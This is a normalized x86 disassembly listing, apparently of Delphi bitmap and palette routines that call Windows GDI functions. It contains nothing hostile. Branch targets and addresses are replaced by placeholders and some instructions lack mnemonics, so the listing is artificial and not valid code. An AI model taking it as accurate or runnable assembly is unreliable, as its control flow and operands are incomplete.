mov esi eax
mov eax esi
call sub_42710c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424dd4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_42710c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4252d4
xor edx edx
push ebp
push sub_4271a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4256c8
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418d88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425540
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_4271ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4252d4
xor eax eax
push ebp
push sub_42728b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4284c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_427028
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4286a8
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4256c8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418cec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425540
retn
sub_42729c
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4032b0
sub_4272bc
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_427028
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d564
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_427318
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_423664
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_427028
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_427028
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_427364
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4261c8
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_427413
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_427420
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_42746c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_427028
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425a34
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425a34
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_427aba
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026ec
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4277c4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_425920
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_425a34
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_425a34
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_425a34
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_425a34
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_427a6b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_427a5a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_427a38
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_425a34
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_427420
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4261c8
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424bf4
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_417358
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423f34
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
call sub_423f34
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_42598c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427a3f
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425a34
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_427a0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425a34
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_40270c
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423f34
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
call sub_423f34
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423f34
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
call sub_423f34
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425a34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403b10
call sub_403b10
jmp r-xdata
sub_427a61
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427a70
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a8c
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_427ad0
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_427b34
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_427028
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_427d2f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_425a34
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425a34
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_425a34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_427ce7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_42746c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_427d40
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426b9c
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427298
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_427da8
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_4284b8
mov eax [ esi + 0x28 ]
call sub_42729c
mov eax [ esi + 0x2c ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_427de4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_427e9c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cc4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_428808
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_427298
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42729c
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418fac
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_427ed4
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4284b8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427f63
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_427ad0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_42746c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_427f68
mov eax [ ebp - 0x8 ]
call sub_423664
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a8c
call sub_403ae0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_427f94
push ebx
mov ebx eax
mov eax ebx
call sub_428288
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d564
pop ebx
retn
sub_427fc4
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41aeec
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_4284b8
lea eax [ ebx + 0x2c ]
call sub_40d564
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428808
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_428038
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42571c
mov eax ebx
call sub_4286a8
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4283c4
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
